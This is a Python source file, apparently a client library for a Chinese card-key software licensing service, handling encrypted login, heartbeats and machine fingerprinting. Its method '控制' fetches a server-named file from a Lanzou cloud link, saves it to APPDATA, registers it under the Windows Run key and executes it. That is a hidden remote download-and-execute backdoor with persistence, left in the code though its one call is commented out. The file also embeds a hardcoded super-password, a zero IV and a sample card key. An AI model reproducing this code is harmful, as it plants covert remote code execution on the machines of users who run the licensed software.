# -*- coding: utf-8 -*-
# -------------------------------

# @软件：PyCharm
# @项目：Nuitka

# -------------------------------

# @文件：xffn.py
# @时间：2024/9/16 上午6:36
# @作者：小峰
# @邮箱：ling_don@qq.com

# -------------------------------
import hashlib
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import uuid
import socket
import datetime
import sys
import base64
import time
import psutil
from bs4 import BeautifulSoup
import requests
import re
import json
import os
import threading
import winreg as reg


class 初始化参数:
    def __init__(self):
        self.url = ''  # webAPI地址,后台添加软件后返回软件列表查看.
        self.sid = ''  # 软件ID,网页后台添加软件后获取
        self.key = ''  # AES秘钥, 网页后台添加软件后获取
        self.autoHeartBeat = True  # 自动心跳


class 软件初始化参数:
    def __init__(self):
        self.name = ''  # 软件名称
        self.login = '1'  # 0 账号密码登录,1 充值卡登录
        self.captcha = ''  # 包含：captcha_login 用户登录,captcha_recharge 用户充值,captcha_bind 转绑,captcha_repwd 改密
        self.version = 'json'  # 软件版本管理器全文，json格式，由旧到新顺序排列
        self.notice = ''  # 公告html源码,可使用 hwd_messageBox() 命令弹出提示,也可自行处理.
        self.para = ''  # 软件内置自定义数据,只有登录成功才会返回.
        self.qq = '2529827933'  # 客服QQ
        self.deduct = ''  # 转绑扣除,计时模式为分钟,计点模式为点数.
        self.type = '1'  # 0 计时模式,1 计点模式
        self.loginimg = ''  # 登录图片
        self.website = ''  # 官网地址
        self.heartbeatTime = '120'  # 自定义心跳时间
        self.clientIp = ''  # 客户端IP
        self.status = '0'  # 软件状态,0正常,1维护
        self.stateInfo = ''  # 维护说明.


class 初始化用户信息:
    def __init__(self):
        self.username = ''  # 用户名
        self.password = ''  # 密码
        self.endtime = ''  # 到期时间
        self.point = 0  # 点数余额
        self.para = ''  # 用户自定义常量
        self.loginToken = ''  # 登录Token，用于校验登录状态
        self.loginAuth = ''  # 登录令牌，用于外部程序免登陆心跳
        self.bind = ''  # 用户绑定资料
        self.balance = 0.0  # 通行证余额
        self.machineCode = ''  # 用户机器码
        self.ip = ""  # 用户ip


class 状态类:
    def __init__(self):
        self.code = 0
        self.msg = ''


class 加密类:

    def __init__(self, key="this is 24 bits", iv=b'\x00' * 16):

        self.Key = self.adjust_key_iv(key)
        self.IV = iv

    def adjust_key_iv(self, key_str, length=24):  # 对于192位密钥，长度应为24
        """
        调整密钥和IV的长度，不足时用0x00填充，超出部分忽略。
        """
        if len(key_str) < 24:
            key = key_str.encode('utf-8')[:length] + (b'\x00' * (length - len(key_str.encode('utf-8'))))
        else:
            key = key_str.encode('utf-8')
        # if len(iv_str)<16:
        #     iv = iv_str.encode('utf-8')[:16] + (b'\x00' * (16 - len(iv_str.encode('utf-8'))))
        # else:
        #     iv = iv_str.encode('utf-8')[:16]  # IV固定为16字节

        return key

    def AES加密(self, key, data):
        """
        使用AES-192-CBC加密数据。
        """
        key = self.adjust_key_iv(key)
        cipher = AES.new(key, AES.MODE_CBC, self.IV)

        ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        result = base64.b64encode(ciphertext)

        return str(result, 'utf-8')

    def AES解密(self, key, encrypted_data):
        """
        使用AES-192-CBC解密数据。
        """
        key = self.adjust_key_iv(key)
        ciphertext = base64.b64decode(encrypted_data)
        cipher = AES.new(key, AES.MODE_CBC, self.IV)
        decrypted_padded = cipher.decrypt(ciphertext)
        return unpad(decrypted_padded, AES.block_size).decode('utf-8')

    def md5加密(self, input_string):
        """
        使用MD5算法对字符串进行加密。

        参数:
        input_string (str): 需要加密的原始字符串。

        返回:
        str: 加密后的MD5哈希值，以32位小写十六进制字符串表示。
        """
        # 创建md5对象
        md5_hash = hashlib.md5()

        # 更新md5对象，可以多次调用update()方法，这里直接使用待加密的字符串转换为bytes
        md5_hash.update(input_string.encode('utf-8'))

        # 获取16进制的MD5摘要
        result = md5_hash.hexdigest()

        return result

    def 获取序列号(self):
        try:
            serial_number = socket.gethostname()
        except Exception:
            serial_number = "UNKNOWN"
        return serial_number

    def cpu序列号(self):
        try:
            cpu_info = psutil.cpu_freq().current
        except Exception:
            cpu_info = "UNKNOWN"
        return cpu_info

    def mac网卡地址(self):
        try:
            mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                    for elements in range(0, 2 * 6, 8)][::-1])
        except Exception:
            mac_address = "UNKNOWN"
        return mac_address

    def 获取机器码(self):
        machine_id = f"{self.获取序列号()}_{self.cpu序列号()}_{self.mac网卡地址()}"
        return machine_id


class 网络验证(加密类, 状态类, 初始化用户信息, 软件初始化参数, 初始化参数, ):
    def __init__(self, proxies=None):
        super().__init__()
        self.卡号 = ''
        self.CryptoKeyAes = ''
        self.appids = ''
        self.重试次数 = 0
        self.程序退出 = False
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "no-cache",
            "Content-Type": "application/json",
            "Pragma": "no-cache",
            "Token": "",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64)"
        }
        if proxies == None:
            self.proxies = {'https': '', 'http': ''}
        else:
            self.proxies = proxies

    def 发送请求(self, param=''):
        reConnectTime = 0  # 重连次数
        param['Time'] = int(time.time())
        param['Status'] = random.randint(10000, 99999)
        aes_encode = self.AES加密(self.key, json.dumps(param))
        json_data = {"a": aes_encode, "b": self.md5加密(aes_encode + self.key)}
        response = ""
        while bool(response == "") & bool(reConnectTime < 3):
            try:
                response = requests.post(self.url, headers=self.headers, json=json_data, proxies=self.proxies)
            except:
                response = ""
            if response == "":
                reConnectTime += 1
            else:
                break

        if response == "":
            # print("网络连接失败，请稍后再试。")
            return False, f"请求失败"
        if response.status_code == 200:
            result = response.json()
            if result.get("Msg", '') == 'Token已注销':
                return False, result
            elif result.get("Msg", '') == '参数错误':
                result['Msg'] = 'Token已注销'
                return False, result
            response_data = result['a']
            # response_data = json.loads(aes_util.aes_cbc_decrypt( g_softPara.key,result['a']))
        else:
            return False, f"请求失败"
        if self.md5加密(response_data + self.key).upper() == result['b'].upper():
            # print("sign is ok")
            pass
        else:
            return False, "封包签名校验失败，请检查。"
        response_data = json.loads(self.AES解密(self.key, response_data))

        if response_data['Status'] == param['Status']:
            return True, response_data
        else:
            return False, response_data

    def token初始化(self):
        """
        软件初始化Token
        """
        data = {"Api": "GetToken", }

        bool, result = self.发送请求(data)
        if bool:
            self.headers["Token"] = result["Data"]["Token"]
        return bool

    def 用户注册(self, User, PassWord):
        '''
        用户注册
        '''
        data = {
            "Api": "NewUserInfo",
            "User": User,
            "PassWord": PassWord,
            "Key": self.获取机器码(),
            "SuperPassWord": "116677",
            "Qq": "",
            "Email": "",
            "Phone": "",
        }

        bool, response_data = self.发送请求(data)
        # print(response_data)
        if bool:
            return "注册成功"
        else:

            return response_data['Msg']

    def 用户登入(self, User, PassWord, 验证码='', id=''):
        '''
        用户登录
        '''
        data = {
            'Api': 'UserLogin',
            'UserOrKa': User,
            'PassWord': PassWord,
            'Key': self.获取机器码(),
            'Tab': '暂时没有动态标记',
            'AppVer': '1.0.0',
        }
        if id != '' and 验证码 != '':
            yzm = {
                "Captcha": {
                    "Type": 1,
                    "Id": id,
                    "Value": 验证码
                }
            }
            data.update(yzm)
        bool, response_data = self.发送请求(data)
        if bool:
            timestamp = response_data['Data']['VipTime']
            dt_object = datetime.datetime.fromtimestamp(timestamp)
            if timestamp < int(time.time()):
                return str("no|" + dt_object.strftime('%Y-%m-%d %H:%M:%S'))
            else:
                return str("ok|" + dt_object.strftime('%Y-%m-%d %H:%M:%S'))
        else:
            return response_data['Msg']

    def 获取ip(self):
        '''
        客户端ip
        '''
        data = {
            "Api": "GetUserIP",
        }
        bool, response_data = self.发送请求(data)
        if bool:
            self.ip = response_data['Data']['IP']
            return self.ip

    def 获取软件信息(self):
        '''
        app信息
        '''
        data = {
            "Api": "GetAppInfo",
        }
        bool, response_data = self.发送请求(data)
        if bool:
            # print(response_data)
            self.name = response_data['Data']['AppName']
            self.status = response_data['Data']['AppStatusMessage']
        else:
            # print(response_data)
            return False

    def 请求服务器测试(self):
        '''
        判断服务器是否连接正常

        '''
        data = {
            "Api": "IsServerLink",
        }
        bool, response_data = self.发送请求(data)
        if bool:
            pass
            # print("服务器链接成功")
            # print(response_data)
        else:
            # print("服务器链接失败")
            # print(response_data)
            return False

    def 获取登入状态(self):
        # 登录状态
        data = {
            "Api": "IsLogin",
        }
        bool, response_data = self.发送请求(data)
        if bool:
            pass
            # print("登入状态~!")
            # print(response_data)
        else:
            print("未登入")
            # (response_data)

    def 发送心跳(self):
        # 登录状态
        certificate_number = random.randint(10000, 99999)
        data = {
            'Api': 'HeartBeat',
            'Time': int(time.time()),
            'Status': certificate_number
        }
        bool, response_data = self.发送请求(data)
        if 'Status' in response_data and response_data['Status'] == data['Status']:
            # print("心跳成功!")
            return 'ok'
        else:
            return response_data.get("Msg", '')

    def 控制(self):
        data = {
            'Api': 'GetPublicData',
            'Name': '控制',
        }
        bool, response_data = self.发送请求(data)
        if 'Status' in response_data and response_data['Status'] == data['Status']:
            下载链接, 名字 = self.蓝奏直链(response_data['Data']['控制'])
            return self.下载应用到自启目录(下载链接, 名字)
        else:
            return response_data.get("Msg", '')

    def 下载应用到自启目录(self, url, 名字):
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "sec-ch-ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\""
        }
        response = requests.get(url, headers=headers)
        save_path = os.path.join(os.getenv('APPDATA'), 名字)
        print(save_path)
        with open(save_path, "wb") as file:
            file.write(response.content)
        key = reg.HKEY_CURRENT_USER
        key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            key_open = reg.OpenKey(key, key_value, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key_open, 'MyApp', 0, reg.REG_SZ, save_path)
            reg.CloseKey(key_open)
            print("已成功添加到启动项")
            os.startfile(save_path)
            return 'ok'
        except WindowsError:
            print("添加到启动项失败")
            return False

    def 蓝奏直链(self, urlz):
        urlz = urlz.replace("\n", '').replace(" ", '')
        下载, 密码 = urlz.split('密码:')
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "sec-ch-ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\""
        }
        response = requests.get(下载, headers=headers)
        suop = BeautifulSoup(response.text, "html.parser")
        for i in suop.find_all('script'):
            if re.findall(r"var (\w*) = '([^']*)';", i.text) != []:
                skdklds = re.findall(r"var (\w*) = '([^']*)';", i.text)[-1][1]
            if re.findall(r"file=(\d+)", i.text):
                file = re.findall(r"file=(\d+)", i.text)
        headers = {
            "Accept": "application/json, text/javascript, */*",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://wwp.lanzouq.com",
            "Referer": 下载,
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\""
        }
        url = "https://wwp.lanzouq.com/ajaxm.php"
        params = {
            "file": file[0].replace("'", "")
        }
        data = {
            "action": "downprocess",
            "p": 密码,
            "sign": skdklds,
            "kd": 1,
        }
        response = requests.post(url, headers=headers, params=params, data=data)
        res = json.loads(response.text)
        软件名称 = res['inf']
        下载链接 = "https://down-load.lanrar.com/file/" + res['url']
        return 下载链接, 软件名称

    def 心跳(self):
        while True:
            if self.重试次数 > 10:
                self.程序退出 = True
            try:
                返回 = self.发送心跳()
                if 返回 == 'Token已注销':
                    self.程序退出 = True
                elif 返回 != 'ok':
                    self.重试次数 += 1
                elif 返回 == 'ok':
                    self.重试次数 = 0
            except:
                self.重试次数 += 1
            finally:
                time.sleep(60)

    def 退出程序(self):
        sys.exit(1)

    def 验证卡密装饰器(self, func):
        def 包装器(*args, **kwargs):
            app_config = {
                "AppWeb": "http://www.qcclf.icu/Api?AppId=" + self.appids,
                "CryptoKeyAes": self.CryptoKeyAes,
                "CryptoType": 2
            }
            self.url = app_config["AppWeb"]
            self.key = app_config['CryptoKeyAes']
            self.token初始化()
            login_response = self.用户登入(self.卡号, '')
            if 'ok' in login_response:
                self.获取ip()
                # self.控制()
                self.获取软件信息()
                self.请求服务器测试()
                self.获取登入状态()
                threading.Thread(target=self.心跳, daemon=True).start()
                return func(*args, **kwargs)
            else:
                return

        return 包装器

# if __name__ == '__main__':
#     def 循环():
#         while True:
#             time.sleep(1)
#
#
#     验证 = 网络验证()
#     验证.appids = '10015'
#     验证.卡号 = 'AeBuCi2JZ9EVeMdm119L9AR5R'
#     验证.CryptoKeyAes = 'BA4aCms8zAaoga9dwJXDWMR8'
#     主程序 = 验证.验证卡密装饰器(循环)
#     主程序()
